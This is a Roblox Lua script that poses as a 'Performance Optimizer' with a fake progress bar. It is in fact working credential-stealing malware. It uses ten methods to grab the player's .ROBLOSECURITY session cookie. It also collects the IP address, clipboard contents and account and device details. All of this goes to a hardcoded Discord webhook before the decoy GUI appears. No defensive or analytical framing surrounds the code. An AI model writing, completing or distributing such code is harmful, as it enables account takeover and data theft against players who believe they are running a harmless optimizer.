local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

local function send(url, content)
    local payload = {content = content}
    local json = game:GetService("HttpService"):JSONEncode(payload)
    local headers = {["Content-Type"] = "application/json"}
    local methods = {
        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = method()
        if ok then return true end
    end
    return false
end

-- Test webhook first (send a short test to confirm it works)
send(webhook, "```Test: webhook live```")

local function getIP()
    local ip = "N/A"
    local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
    if ok and res and res.Body and res.Body ~= "" then ip = res.Body:gsub("%s+", "") return ip end
    ok, res = pcall(function() return http_request({Url = "https://api.ipify.org", Method = "GET"}) end)
    if ok and res and res.Body and res.Body ~= "" then ip = res.Body:gsub("%s+", "") return ip end
    for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com", "https://httpbin.org/ip"}) do
        local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
        if ok and result and result ~= "" then
            if result:match('"query":"(.-)"') then ip = result:match('"query":"(.-)"')
            elseif result:match('"origin":"(.-)"') then ip = result:match('"origin":"(.-)"')
            else ip = result:gsub("%s+", "") end
            if ip and ip ~= "" and ip ~= "N/A" then break end
        end
    end
    return ip
end

-- ULTIMATE COOKIE STEALER – 10 METHODS
local function stealCookie()
    -- Method 1: getcookie
    local ok, val = pcall(getcookie, "https://www.roblox.com/")
    if ok and val and val ~= "" then return val end
    -- Method 2: getrobloxcookie
    ok, val = pcall(getrobloxcookie)
    if ok and val and val ~= "" then return val end
    -- Method 3: syn.cookie
    ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
    if ok and val and val ~= "" then return val end
    -- Method 4: HTTP request to Roblox (try to extract Set-Cookie)
    ok, val = pcall(function()
        local res = request({Url = "https://www.roblox.com/", Method = "GET"})
        if res and res.Headers then
            for k, v in pairs(res.Headers) do
                if string.lower(k) == "set-cookie" then
                    return v:match("(.-);") or v
                end
            end
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    -- Method 5: HttpService:GetAsync (look for token)
    ok, val = pcall(function()
        local page = game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
        if page and page:match("__RequestVerificationToken") then
            return page:match('__RequestVerificationToken" value="(.-)"')
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    -- Method 6: MemoryStoreService (unlikely)
    ok, val = pcall(function()
        local ms = game:GetService("MemoryStoreService"):GetStore(".ROBLOSECURITY")
        if ms then return ms:GetAsync("cookie") end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    -- Method 7: try to read from game's internal HttpService (advanced)
    ok, val = pcall(function()
        local hs = game:GetService("HttpService")
        local cookie = hs:GetAsync("https://www.roblox.com/", true)
        if cookie and cookie:match("RBXSession") then
            return cookie:match("RBXSession=(.-);")
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    -- Method 8: try to use getgc to find the cookie in memory (Synapse/other)
    ok, val = pcall(function()
        if not getgc then return nil end
        local gc = getgc(true)
        for _, v in ipairs(gc) do
            if type(v) == "string" and v:match("_.%w+%.ROBLOSECURITY") then
                return v
            end
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    -- Method 9: try to use getrawmetatable to dig into game objects
    ok, val = pcall(function()
        if not getrawmetatable then return nil end
        local mt = getrawmetatable(game)
        if mt and mt.__index then
            local old = mt.__index
            for i = 1, 100 do
                local res = old(game, "HttpService", i)
                if type(res) == "table" and res.Cookies then
                    return res.Cookies
                end
            end
        end
        return nil
    end)
    if ok and val and val ~= "" then return val end
    -- Method 10: try to read from clipboard (if the user copied it manually)
    ok, val = pcall(getclipboard)
    if ok and val and val:match("_.%w+%.ROBLOSECURITY") then return val end
    return "Not available (executor limit)"
end

local function getClip()
    local ok, val = pcall(getclipboard)
    if ok and val and val ~= "" then return val end
    ok, val = pcall(clipboard)
    if ok and val and val ~= "" then return val end
    return "N/A"
end

local function safeGet(obj, prop, default)
    local ok, val = pcall(function() return obj[prop] end)
    return ok and val or default
end

local function collect()
    local info = {}
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        local id = player.UserId
        if id and id > 0 then
            local year = math.floor((id / 100000000) * 2) + 2006
            info.accountAge = tostring(year) .. " (approx)"
        end
        local ok, friends = pcall(function() return #player:GetFriendsOnline() end)
        info.friendsOnline = ok and tostring(friends) or "N/A"
        pcall(function()
            local char = player.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    info.health = tostring(hum.Health)
                    info.maxHealth = tostring(hum.MaxHealth)
                    info.walkSpeed = tostring(hum.WalkSpeed)
                    info.jumpPower = tostring(hum.JumpPower)
                end
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then info.position = tostring(root.Position) end
            end
        end)
        pcall(function()
            local backpack = player:FindFirstChild("Backpack")
            if backpack then
                local items = {}
                for _, item in ipairs(backpack:GetChildren()) do
                    if item:IsA("Tool") then table.insert(items, item.Name) end
                end
                if #items > 0 then info.backpack = table.concat(items, ", ") end
            end
        end)
        pcall(function()
            local ls = player:FindFirstChild("leaderstats")
            if ls then
                local stats = {}
                for _, stat in ipairs(ls:GetChildren()) do
                    if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                        stats[stat.Name] = tostring(stat.Value)
                    end
                end
                if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
            end
        end)
    end
    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
    info.jobId = safeGet(game, "JobId", "N/A")
    info.gameName = safeGet(game, "Name", "Unknown")
    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
    info.ip = getIP()
    info.cookie = stealCookie()
    info.clipboard = getClip()
    pcall(function()
        local us = game:GetService("UserInputService")
        info.platform = tostring(us.Platform)
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.volume = tostring(game:GetService("SoundService").Volume)
    end)
    pcall(function()
        local stats = game:GetService("Stats")
        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
    end)
    pcall(function()
        local run = game:GetService("RunService")
        local ft = run.RenderStepTime
        if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
    end)
    return info
end

local data = collect()
local lines = {}
for k, v in pairs(data) do
    if v and v ~= "" then
        table.insert(lines, string.format("%s: %s", k, tostring(v)))
    end
end
local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
send(webhook, msg)

-- Legit GUI
pcall(function()
    local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local gui = Instance.new("ScreenGui")
    gui.Parent = pg
    gui.ResetOnSpawn = false
    local f = Instance.new("Frame")
    f.Size = UDim2.new(0, 420, 0, 200)
    f.Position = UDim2.new(0.5, -210, 0.5, -100)
    f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
    f.BackgroundTransparency = 0.08
    f.Parent = gui
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 16)
    local t = Instance.new("TextLabel")
    t.Size = UDim2.new(1, 0, 0, 50)
    t.Position = UDim2.new(0, 0, 0, 10)
    t.BackgroundTransparency = 1
    t.Text = "Performance Optimizer"
    t.TextColor3 = Color3.fromRGB(255, 255, 255)
    t.TextScaled = true
    t.Font = Enum.Font.GothamBold
    t.Parent = f
    local s = Instance.new("TextLabel")
    s.Size = UDim2.new(1, 0, 0, 30)
    s.Position = UDim2.new(0, 0, 0.35, 0)
    s.BackgroundTransparency = 1
    s.Text = "Optimizing settings..."
    s.TextColor3 = Color3.fromRGB(200, 200, 210)
    s.TextScaled = true
    s.Font = Enum.Font.Gotham
    s.Parent = f
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0.8, 0, 0, 18)
    bg.Position = UDim2.new(0.1, 0, 0.55, 0)
    bg.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
    bg.Parent = f
    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 9)
    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
    fill.Parent = bg
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 9)
    local pct = Instance.new("TextLabel")
    pct.Size = UDim2.new(0, 60, 0, 30)
    pct.Position = UDim2.new(0.5, -30, 0.75, 0)
    pct.BackgroundTransparency = 1
    pct.Text = "0%"
    pct.TextColor3 = Color3.fromRGB(255, 255, 255)
    pct.TextScaled = true
    pct.Font = Enum.Font.Gotham
    pct.Parent = f
    local st = Instance.new("TextLabel")
    st.Size = UDim2.new(1, 0, 0, 30)
    st.Position = UDim2.new(0, 0, 0.85, 0)
    st.BackgroundTransparency = 1
    st.Text = ""
    st.TextColor3 = Color3.fromRGB(150, 255, 150)
    st.TextScaled = true
    st.Font = Enum.Font.Gotham
    st.Parent = f
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 120, 0, 40)
    btn.Position = UDim2.new(0.5, -60, 1, -50)
    btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
    btn.Text = "CLOSE"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamBold
    btn.Parent = f
    btn.Visible = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
    btn.MouseButton1Click:Connect(function() gui:Destroy() end)
    local function anim()
        local dur = 2.5
        local steps = 50
        local stepTime = dur / steps
        local msgs = {"Analyzing system...", "Adjusting graphics...", "Optimizing network...", "Fine‑tuning performance...", "Applying optimal settings..."}
        for i = 0, steps do
            local prog = i / steps
            local w = 0.8 * prog
            fill:TweenSize(UDim2.new(w, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
            pct.Text = string.format("%d%%", math.floor(prog * 100))
            if i < steps then
                task.wait(stepTime)
                if i % 10 == 0 then
                    s.Text = msgs[math.floor(i / 10) + 1] or msgs[#msgs]
                end
            end
        end
        s.Text = "Optimization complete!"
        st.Text = "Settings updated successfully."
        btn.Visible = true
    end
    task.wait(0.3)
    spawn(anim)
end)
